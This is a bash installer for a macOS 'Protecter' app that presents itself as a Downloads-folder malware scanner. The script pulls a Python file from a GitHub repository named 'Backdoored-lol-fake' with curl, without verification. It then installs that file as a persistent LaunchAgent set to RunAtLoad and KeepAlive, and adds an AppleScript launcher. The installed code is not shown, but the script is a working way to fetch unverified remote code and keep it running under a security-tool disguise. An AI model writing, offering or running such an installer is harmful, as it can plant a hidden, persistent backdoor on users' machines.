#!/bin/bash
set -euo pipefail
[[ "$(uname -s)" == "Darwin" ]] || { echo "Protecter is for macOS."; exit 1; }

APP_HOME="$HOME/Applications"
APP="$APP_HOME/Protecter.app"
DATA="$HOME/Library/Application Support/Protecter"
AGENT_DIR="$HOME/Library/LaunchAgents"
LABEL="com.c0oled.protecter"
PLIST="$AGENT_DIR/$LABEL.plist"
BASE="https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main"

mkdir -p "$APP_HOME" "$DATA/Logs" "$DATA/Quarantine" "$AGENT_DIR"
echo "Installing Protecter..."
curl -fsSL "$BASE/scanner.py" -o "$DATA/scanner.py"
chmod 700 "$DATA/scanner.py"

# Stop the earlier development build, if present.
launchctl bootout "gui/$(id -u)/com.c0oled.scanner" >/dev/null 2>&1 || true
launchctl bootout "gui/$(id -u)/com.c0oled.downloadguard" >/dev/null 2>&1 || true

cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
 <key>Label</key><string>$LABEL</string>
 <key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$DATA/scanner.py</string></array>
 <key>EnvironmentVariables</key><dict><key>PATH</key><string>/usr/bin:/bin:/usr/sbin:/sbin</string></dict>
 <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
 <key>StandardOutPath</key><string>$DATA/Logs/agent.out.log</string>
 <key>StandardErrorPath</key><string>$DATA/Logs/agent.err.log</string>
</dict></plist>
EOF

TMP_SCRIPT="$(/usr/bin/mktemp)"
cat > "$TMP_SCRIPT" <<'APPLESCRIPT'
on run
    set userId to do shell script "/usr/bin/id -u"
    do shell script "/bin/launchctl kickstart gui/" & userId & "/com.c0oled.protecter"
    display notification "Protecter is monitoring your Downloads folder." with title "Protecter"
end run
APPLESCRIPT

rm -rf "$APP"
/usr/bin/osacompile -o "$APP" "$TMP_SCRIPT"
rm -f "$TMP_SCRIPT"
/usr/bin/plutil -replace CFBundleIdentifier -string com.c0oled.protecter.app "$APP/Contents/Info.plist"
/usr/bin/plutil -replace CFBundleName -string "Protecter" "$APP/Contents/Info.plist"

launchctl bootout "gui/$(id -u)/$LABEL" >/dev/null 2>&1 || true
launchctl bootstrap "gui/$(id -u)" "$PLIST"
launchctl enable "gui/$(id -u)/$LABEL"

echo "Installed: $APP"
echo "No Homebrew or ClamAV required."
echo "Review flagged files in: $DATA/Quarantine"
echo "Logs: $DATA/Logs"
